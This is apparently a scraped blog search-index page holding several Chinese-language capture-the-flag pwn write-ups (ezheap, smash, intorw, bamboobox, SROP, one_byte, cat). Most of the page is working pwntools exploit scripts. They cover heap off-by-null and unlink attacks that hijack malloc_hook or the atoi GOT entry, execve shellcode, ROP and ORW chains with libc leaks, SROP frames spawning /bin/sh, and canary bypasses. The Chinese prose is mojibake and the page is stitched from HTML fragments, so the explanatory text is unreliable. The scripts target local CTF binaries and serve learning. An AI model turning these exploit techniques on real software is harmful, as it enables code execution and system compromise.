&lt;p&gt;ç¨‹åºä¸­å­˜åœ¨ç¼–è¾‘å‡½æ•°ï¼Œéœ€è¦å€ŸåŠ©å®ƒå†™å…¥shellcodeå’ŒåŠ«æŒmalloc_hookå‡½æ•°ï¼Œé‚£ä¹ˆåˆ™éœ€è¦åœ¨å¯å†™å¯æ‰§è¡Œçš„åœ°å€å—å’Œmalloc_hookåœ°å€å¤„åˆ›é€ fake chunkï¼Œç”±äºå­˜åœ¨off by NULLæ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡freed chunkåˆå¹¶å®ç°freed chunkçš„fdå’ŒbkæŒ‡é’ˆä¿®æ”¹ï¼Œä»è€Œä¹‹åå¯ä»¥æŠŠchunkåˆ†é…åˆ°ç›®æ ‡åœ°å€å®ç°ä¿®æ”¹ï¼Œunsorted binsç¬¬ä¸€æ¬¡ç”³è¯·æ—¶ï¼Œfdå’Œbkä¼šæŒ‡å‘&amp;lt;main_arena + 96&amp;gt;å¤„ï¼ˆ64ä½ï¼‰ï¼Œè€Œ&amp;lt;main_arena + 96&amp;gt;åªä¸malloc_hookå‡½æ•°ç›¸å·®ä¸€ä¸ªå­—èŠ‚&lt;/p&gt;
&lt;h1 id=&#34;å‘ååˆå¹¶æµç¨‹&#34;&gt;å‘ååˆå¹¶æµç¨‹&lt;/h1&gt;
&lt;p&gt;1.æ£€æŸ¥pæŒ‡å‘chunkçš„sizeå­—æ®µçš„pre_inuseä½ï¼Œæ˜¯å¦ä¸º0ï¼ˆä¹Ÿå°±æ˜¯æ£€æŸ¥å½“å‰chunkçš„å‰ä¸€å—chunkæ˜¯å¦æ˜¯freeçš„ï¼Œå¦‚æœæ˜¯åˆ™è¿›å…¥å‘å‰åˆå¹¶çš„æµç¨‹)&lt;br&gt;
2.è·å–å‰ä¸€å—chunkçš„sizeï¼Œå¹¶åŠ åˆ°sizeä¸­ï¼ˆä»¥æ­¤æ¥è¡¨ç¤ºsizeå¤§å°ä¸Šå·²ç»åˆå¹¶ï¼‰&lt;br&gt;
3.æ ¹æ®å½“å‰chunkçš„presizeæ¥è·å¾—æŒ‡å‘å‰ä¸€å—chunkçš„æŒ‡é’ˆ&lt;br&gt;
4.å°†è¿™ä¸ªæŒ‡é’ˆä¼ å…¥unlinkçš„å®ï¼ˆä¹Ÿå°±æ˜¯è®©freeæ‰çš„chunkçš„å‰ä¸€å—chunkè¿›å…¥åˆ°unlinkæµç¨‹ï¼‰&lt;/p&gt;
&lt;h1 id=&#34;expå¦‚ä¸‹&#34;&gt;expå¦‚ä¸‹&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./ezheap&#39;)

def add(size):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;Size: &amp;quot;, str(size))
	p.recvuntil(&#39;0x&#39;)
	return int(p.recv(12),16)
    	
def dele(idx):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;2&amp;quot;)
	p.sendlineafter(&amp;quot;Index: &amp;quot;, str(idx))

def edit(idx, content):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;3&amp;quot;)
	p.sendlineafter(&amp;quot;Index: &amp;quot;, str(idx))
	p.sendlineafter(&amp;quot;Content: &amp;quot;, content)

p.recvuntil(&#39;0x&#39;)
mmap_addr = int(p.recv(10),16)
#gdb.attach(p)
add(0x410)  #å¤§å°åœ¨unsorted binå†…ï¼Œä¸ºåç»­unlinkåšå‡†å¤‡(bkéœ€è¦æ˜¯0x4f0çš„chunkçš„åœ°å€)
add(0x18)   
add(0x28)   
add(0x4f0)  #size=0x500ï¼Œå¯åˆ©ç”¨off by NULLå°†æ ‡å¿—ä½ç½®0ï¼Œå®ç°chunkè¦†ç›–
add(0x10)   #é˜²æ­¢ä¸top chunkåˆå¹¶
dele(0)     #ä¸ºåç»­unlinkåšå‡†å¤‡
edit(2,p64(0)*4+p64(0x470)) #å®ç°chunkåˆå¹¶
dele(3) #å®ç°chunkåˆå¹¶
dele(1) 
dele(2) #å°†å…¶ç½®å…¥tcache binä¸­
add(0x430) 
add(0x520)
edit(0,b&#39;a&#39;*0x410+p64(0)+p64(0x20)+p64(mmap_addr))
edit(1,&amp;quot;\x30&amp;quot;)
add(0x18)
add(0x18)   #ä¿®æ”¹fdä¸ºshellcodeåœ°å€
shellcode = b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;quot; #æœ‰ç°æˆçš„0x18å­—èŠ‚ä¹‹å†…çš„shellcode
edit(3,shellcode)
add(0x28)
add(0x28)
edit(6,p64(mmap_addr))  #ä¿®æ”¹fdä¸ºmalloc_hookåœ°å€

p.sendlineafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;, b&amp;quot;1&amp;quot;)
p.sendlineafter(&amp;quot;Size: &amp;quot;,b&amp;quot;0&amp;quot;)

p.interactive()

&lt;/code&gt;&lt;/pre&gt;
">ezheap</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/smash/"" data-c="
          &lt;p&gt;æŸ¥çœ‹ä¿æŠ¤&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708948704186.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°å¼€äº†canaryä¿æŠ¤ï¼Œå¹¶ä¸”æ— æ³•ä¿®æ”¹gotè¡¨ï¼Œå—¯.......æ²¡å•¥å¯è¯´çš„ï¼Œå°±æ˜¯æ™®é€šçš„smash........&lt;img src=&#34;https://l1u66.github.io//post-images/1708949414464.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./smash2.23&#39;)

flag = 0x404060

payload = b&#39;a&#39;*504 + p64(flag)
p.sendlineafter(&amp;quot;\n&amp;quot;,payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708949496610.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">smash</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/intorwjing-dian-orw/"" data-c="
          &lt;p&gt;æŸ¥çœ‹ä¿æŠ¤&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708944892857.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°æ— æ³•ä¿®æ”¹gotè¡¨&lt;br&gt;
æŸ¥çœ‹å‡½æ•°æƒé™&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708944975027.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥æ‰“orwï¼Œå…ˆç”¨-1ç»•è¿‡é•¿åº¦æ£€éªŒï¼Œç„¶åå‘ç°ç¨‹åºä¸­è‡ªå¸¦flagå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æ²¡æœ‰pop rdxçš„ROPï¼Œæ‰€ä»¥åˆ©ç”¨csuå‘rdxä¼ å…¥å‚æ•°ï¼Œåé¢å°±æ˜¯ç›´æ¥æ‰“orw&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./intorw&#39;)
elf = ELF(&#39;./intorw&#39;)
rdi = 0x400ad3
rsi_r15 = 0x400ad1
puts_got = 0x600FC0
puts_plt = 0x400760
vuln = 0x4009C4
flag = 0x601046
bss = 0x6010E0

p.sendlineafter(&amp;quot;read\n&amp;quot;,b&#39;-1&#39;)

#gdb.attach(p)

payload = b&#39;a&#39;*40 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.sendline(payload)

puts = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(&amp;quot;puts = &amp;quot;,hex(puts))
base = puts - 0x80E50
open_ = base + 0x1144E0
read_plt = 0x400790
#pause()
p.sendlineafter(&amp;quot;read\n&amp;quot;,b&#39;-1&#39;)


read_got = 0x600FD8
mov_addr = 0x400ab0
pop_addr = 0x400aca

payload = b&#39;a&#39;*40 + p64(rdi) + p64(flag) + p64(rsi_r15) + p64(0) + p64(0) + p64(open_)
payload += p64(pop_addr) + p64(0) + p64(1) + p64(read_got) + p64(0x3) + p64(bss) + p64(0x30) + p64(mov_addr)+ p64(0)*7
payload += p64(rdi) + p64(bss) + p64(puts_plt)
p.sendline(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;img src=&#34;https://l1u66.github.io//post-images/1708948528560.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">intorwï¼ˆç»å…¸orwï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/bamboobox/"" data-c="
          &lt;p&gt;æŸ¥çœ‹ä¿æŠ¤&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708591140474.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;add_item&#34;&gt;add_item&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708591174637.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¤§è‡´å°±æ˜¯æœ‰ä¸ªitemlistå­˜æ”¾ç€æ¯ä¸€itemçš„å¤§å°ï¼Œitemå­˜ç€å†…å®¹&lt;/p&gt;
&lt;h1 id=&#34;change_item&#34;&gt;change_item&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708591202345.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°ä¿®æ”¹å†…å®¹æ—¶å¯¹è¾“å…¥é•¿åº¦æ²¡æœ‰æ£€æŸ¥ï¼Œå¯ä»¥äº§ç”Ÿå †æº¢å‡º&lt;/p&gt;
&lt;h1 id=&#34;show_item&#34;&gt;show_item&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708591225947.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;remove_item&#34;&gt;remove_item&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708591249649.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°freeåç½®0ï¼Œæ²¡æœ‰UAF&lt;/p&gt;
&lt;h1 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯ï¼š&lt;/h1&gt;
&lt;p&gt;1.ä¼ªé€ ä¸€ä¸ªfreed chunk&lt;br&gt;
2.é€šè¿‡ unlink æŠŠ chunk ç§»åˆ°å­˜å‚¨ chunk æŒ‡é’ˆçš„å†…å­˜å¤„&lt;br&gt;
3.è¦†ç›– chunk 0 æŒ‡é’ˆä¸º atoi çš„ got è¡¨åœ°å€å¹¶æ³„éœ²å¾—åˆ°libcåŸºåœ°å€&lt;br&gt;
4.å°†atoiå‡½æ•°æˆ–ï¼ˆfreeå‡½æ•°ï¼‰çš„å®é™…åœ°å€æ”¹ä¸ºsystemå‡½æ•°çš„åœ°å€&lt;br&gt;
5.ä¼ å…¥/bin/shï¼Œè°ƒç”¨ atoi å‡½æ•°å¾—åˆ°shellï¼ˆåˆ›å»ºä¸€ä¸ª/bin/shçš„chunkå¹¶freeï¼‰&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./bamboobox&#39;)
libc = ELF(&#39;./libc-2.23.so&#39;)
 
def add(length,name):
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(b&#39;2&#39;)
	p.recvuntil(b&#39;:&#39;)
	p.sendline(str(length))
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(name)
 
def change(idx,length,name):
	p.recvuntil(b&#39;:&#39;)
	p.sendline(b&#39;3&#39;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(length))
	p.recvuntil(b&#39;:&#39;)
	p.sendline(name)
 
def remove(idx):
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;4&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
 
def show():
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;1&amp;quot;)

#gdb.attach(p)
add(0x40,b&#39;a&#39; * 8)
add(0x80,b&#39;b&#39; * 8)
add(0x80,b&#39;c&#39; * 8)  #é˜²æ­¢ä¸top_chunkåˆå¹¶
 
itemlist = 0x6020c8

#æ„é€ è™šå‡çš„chunk
payload = p64(0)
payload += p64(0x41)
payload += p64(itemlist - 0x18)              #ç»•è¿‡å¯¹unlinkçš„ä¿æŠ¤
payload += p64(itemlist - 0x10)              #ç»•è¿‡å¯¹unlinkçš„ä¿æŠ¤
payload += b&#39;c&#39;*0x20
payload += p64(0x40)
payload += p64(0x90)
change(0,0x80,payload)
 
remove(1)
payload = p64(0) * 2
payload += p64(0x40) + p64(0x602068)  
change(0,0x80,payload)                               #ä¿®æ”¹itrmlist[0]
 
show()
p.recvuntil(b&amp;quot;: &amp;quot;)
atoi = u64(p.recvuntil(&amp;quot;:&amp;quot;)[:6].ljust(8,b&#39;\x00&#39;))
base = atoi - libc.symbols[&#39;atoi&#39;]
print(&amp;quot;base = &amp;quot;,base)
sys = base + libc.symbols[&#39;system&#39;]
 
change(0,0x8,p64(sys))                     #å°†atoiä¿®æ”¹ä¸ºsystem
 
p.recvuntil(b&amp;quot;:&amp;quot;)
p.sendline(b&amp;quot;/bin/sh\x00&amp;quot;)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">bambooboxï¼ˆunlinkï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/srop/"" data-c="
          &lt;h1 id=&#34;pwn&#34;&gt;pwn&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708576880109.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¸»è¦é€»è¾‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708577115158.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°æº¢å‡ºéå¸¸å¤šï¼Œå¹¶ä¸”è¯»å…¥åwriteå‡½æ•°ä¹Ÿè¿‡å¤šè¯»å–ï¼Œå¯ä»¥å€Ÿæ­¤æ³„éœ²æ ˆåœ°å€&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708579972036.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°ç»™å‡ºäº†&lt;code&gt;mov  rax,0fh&lt;/code&gt;gadgetsï¼Œ0xfåˆšå¥½æ˜¯64ä½sigreturnå‡½æ•°çš„ç³»ç»Ÿè°ƒå·ï¼Œå¦‚æœè¦æ‰“sropéœ€è¦çŸ¥é“/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œä½†æ˜¯è¾“å…¥åœ°å€åœ¨æ ˆä¸Šï¼Œå¹¶ä¸”ç¨‹åºä¸­ä¸å«/bin/shå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ„é€ å¹¶è®¡ç®—åç§»ï¼ˆç¬¬äºŒæ¬¡è¾“å…¥/bin/shå­—ç¬¦ä¸²ï¼Œè®¡ç®—æ³„éœ²çš„æ ˆåœ°å€å’Œå­—ç¬¦ä¸²çš„åç§»ï¼Œè¿™é‡Œè®¡ç®—çš„æ˜¯0x148ï¼‰ï¼Œ&lt;/p&gt;
&lt;h2 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯ï¼š&lt;/h2&gt;
&lt;p&gt;1.å€Ÿç”¨ç¬¬ä¸€æ¬¡æ ˆæº¢å‡ºæ³„éœ²æ ˆåœ°å€&lt;br&gt;
2.æ„é€ sigframeå¾—åˆ°shell&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
vuln = 0x4004ED
mov_rax_0xf = 0x4004DA
syscall = 0x400517

#gdb.attach(p)

payload = b&#39;a&#39;*16 + p64(vuln)
p.send(payload)
stack = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(stack))
sh = stack - 328

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = sh
sigframe.rsi = 0
sigframe.rsp = stack
sigframe.rdx = 0
sigframe.rip = syscall

payload = b&amp;quot;/bin/sh\x00&amp;quot; + p64(0) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;smallest&#34;&gt;smallest&lt;/h1&gt;
&lt;p&gt;è¿™é¢˜........å¥½å¼.......å¤§å¼€çœ¼ç•Œäº†å±äºæ˜¯ğŸ˜¥&lt;br&gt;
æŸ¥çœ‹ä¿æŠ¤å‘ç°åªå¼€äº†NXä¿æŠ¤ï¼Œæ‰“å¼€ç¨‹åºä¸€çœ‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708586883469.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°åªæœ‰è¿™å‡ è¡Œæ±‡ç¼–ä»£ç ï¼Œæœç„¶æ˜¯smallestï¼Œå‘ç°ç¨‹åºç›´æ¥åœ¨rspå†™å…¥ï¼Œç„¶åç›´æ¥retï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„gadgetsï¼Œå·§å¦™çš„æ˜¯&lt;br&gt;
1.å…ˆå‘é€ä¸‰ä¸ªmainå‡½æ•°åœ°å€ï¼Œç„¶ååˆ©ç”¨readå‡½æ•°è¿”å›åœ°å€å°±æ˜¯å†™å…¥çš„å­—èŠ‚æ•°ï¼Œå°†mainå‡½æ•°çš„æœ€åä¸€ä½æ”¹æ‰ï¼Œä½¿raxæ²¡æœ‰ç½®0ï¼Œè¿˜ä¿æŒ1ï¼Œéšåè°ƒç”¨syscallåˆ™ä¼šè°ƒç”¨writeå‡½æ•°ï¼Œæ³„éœ²å‡ºæ ˆåœ°å€ğŸ˜±&lt;br&gt;
2.ç„¶åè°ƒç”¨readå‡½æ•°æŠŠrspè¿ç§»åˆ°æ³„éœ²çš„æ ˆåœ°å€ä¸Šï¼ˆ/bin/shçš„åœ°å€å¯ç¡®å®šï¼‰ï¼ˆå¦‚æœè¦å°†å­—ç¬¦ä¸²æ”¾åˆ°rspé™„è¿‘ä¼šå¦¨ç¢å‡½æ•°è°ƒç”¨ï¼‰ï¼ˆä¹Ÿæœ‰æƒ³è¿‡ç›´æ¥è°ƒç”¨execveå‡½æ•°ä½†æ˜¯åŠ¨æ€è°ƒè¯•å‘ç°æ³„éœ²çš„æ ˆåœ°å€å’Œå­—ç¬¦ä¸²ä¹‹é—´çš„åç§»é‡åœ¨å˜åŒ–ï¼‰&lt;br&gt;
3.è°ƒç”¨execveå‡½æ•°å¾—åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./smallest&amp;quot;)
elf = ELF(&amp;quot;./smallest&amp;quot;)
ret = 0x4000c0
syscall_ret = 0x4000be
main = 0x4000b0

gdb.attach(p)
pause()
payload = p64(main)*3
p.send(payload)
sleep(5)
p.send(b&#39;\xb3&#39;)
stack = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(stack))

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack
sigframe.rsp = stack
sigframe.rdx = 0x400
sigframe.rip = syscall_ret
payload = p64(main) + p64(0) + bytes(sigframe)  #p64(0)å°†ä¼šè¢«åé¢çš„syscall_retåœ°å€è¦†ç›–
p.send(payload)

sleep(5)
#pause()

payload = p64(syscall_ret) + b&amp;quot;\x00&amp;quot;*7   #ä¸€æ–¹é¢æ˜¯0xfå­—èŠ‚è°ƒç”¨sigreturnå‡½æ•°ï¼Œä¸€æ–¹é¢ç”¨\x00è¦†ç›–é˜²æ­¢ä¿®æ”¹sigframe
p.send(payload)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack + 0x200
sigframe.rsp = stack
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall_ret

payload = p64(main) + p64(0) + bytes(sigframe)
payload = payload.ljust(0x200,b&amp;quot;\x00&amp;quot;) + b&amp;quot;/bin/sh\x00&amp;quot;
p.send(payload)

sleep(5)
#pause()

payload = p64(syscall_ret) + b&amp;quot;\x00&amp;quot;*7
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">SROP</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/beginctfbu-fen-wp/"" data-c="
          &lt;h1 id=&#34;one_byte&#34;&gt;one_byte&lt;/h1&gt;
&lt;p&gt;æŸ¥çœ‹ç¨‹åºé€»è¾‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708506835403.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°ç¨‹åºæ‰“å¼€äº†flagæ–‡ä»¶å¹¶å¯ä»¥è¾“å‡ºä¸€ä¸ªå­—æ¯ï¼Œåé¢çš„readå‡ºç°äº†æº¢å‡ºï¼Œåªèƒ½è¦†ç›–rbpå’Œè¿”å›åœ°å€çš„ä¸€ä¸ªå­—èŠ‚&lt;br&gt;
çœ‹çœ‹æ ˆ&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708507601401.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°è¿”å›åˆ°__libc_start_call_main+122ï¼Œç”±äºåªèƒ½æ”¹ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥çœ‹çœ‹__libc_start_call_mainå‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708507095606.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ˜“çŸ¥&lt;code&gt;0x7ffff7df16c8 &amp;lt;__libc_start_call_main+120&amp;gt;: call   rax&lt;/code&gt;è°ƒç”¨äº†mainï¼ˆå› ä¸ºè¿”å›åœ°å€æ˜¯__libc_start_call_main+122ï¼‰ï¼Œå‘ç°&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708507454576.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åœ¨retåæ­£å¥½[rsp + 0x8]æ˜¯mainå‡½æ•°åœ°å€ï¼Œæ‰€ä»¥æŠŠè¿”å›åœ°å€æ”¹ä¸º0x7ffff7df16c3ï¼Œè¦†ç›–0xc3å³å¯&lt;br&gt;
expå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./one_byte&amp;quot;)
elf = ELF(&amp;quot;./one_byte&amp;quot;)

flag = &amp;quot;&amp;quot;
for i in range(100):
    p.recvuntil(b&#39;: &#39;)
    flag += p.recv(1).decode()
    p.sendafter(b&#39;?\n&#39;, b&#39;a&#39;*0x11 + b&#39;\xc3&#39;)

print(flag)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸæ‰“å°å‡ºåˆ›å»ºçš„flag&lt;/p&gt;
&lt;h1 id=&#34;cat&#34;&gt;cat&lt;/h1&gt;
&lt;p&gt;æŸ¥çœ‹ä¿æŠ¤&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708508957098.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æŸ¥çœ‹é€»è¾‘&lt;br&gt;
å…ˆæ˜¯åœ¨bssæ®µæœ‰ä¸¤æ¬¡readï¼Œç„¶åä½œä¸ºå‚æ•°æ¥åˆ°ï¼ˆå­˜åœ¨åé—¨å‡½æ•°ï¼‰&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708509030750.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯å¼€äº†canaryä¿æŠ¤ï¼Œè®¾æ³•ç»•è¿‡ï¼Œç¨‹åºæœ¬èº«ä¸å­˜åœ¨è¾“å‡ºå‡½æ•°ï¼Œä¸å¥½å°†canaryæ³„éœ²ï¼Œå‘ç°å­˜åœ¨strcatå‡½æ•°ï¼Œä¼šå°†å­—ç¬¦ä¸²ç»“å°¾çš„\x00åˆ å»å¹¶æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œcanaryä½åœ°å€å¤„ä»¥\x00ç»“å°¾ï¼Œå°†canaryçš„\x00è¦†ç›–æ‰ï¼Œé‚£ä¹ˆstrcatå‡½æ•°ä¾¿ä¼šä»rbpé«˜åœ°å€çš„\x00å¼€å§‹æ‹¼æ¥ï¼Œå¦‚å›¾&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708511802739.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å€Ÿæ­¤å¯ä»¥é€šè¿‡strcatå‡½æ•°å®ç°ç»•è¿‡canaryå‘retåœ°å€å†™å…¥&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./cat&amp;quot;)
elf = ELF(&amp;quot;./cat&amp;quot;)
sys = 0x4011F6

#gdb.attach(p)

p.sendafter(&amp;quot;\n&amp;quot;,b&amp;quot;bb&amp;quot;+b&amp;quot;\xFE\x11\x40&amp;quot;)
p.sendafter(&amp;quot;\n&amp;quot;,24*b&amp;quot;c&amp;quot;+b&amp;quot;\x00&amp;quot;)

payload = b&#39;a&#39;*57
p.sendafter(&amp;quot;\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸæ‰“å°å‡ºåˆ›å»ºçš„flag(å¯èƒ½ä¸€æ¬¡ä¸é€šï¼Œæ˜¯å› ä¸ºcanaryä¸­å¯èƒ½å­˜åœ¨å…¶ä»–çš„\x00)&lt;/p&gt;
&lt;h1 id=&#34;gift_rop&#34;&gt;gift_rop&lt;/h1&gt;
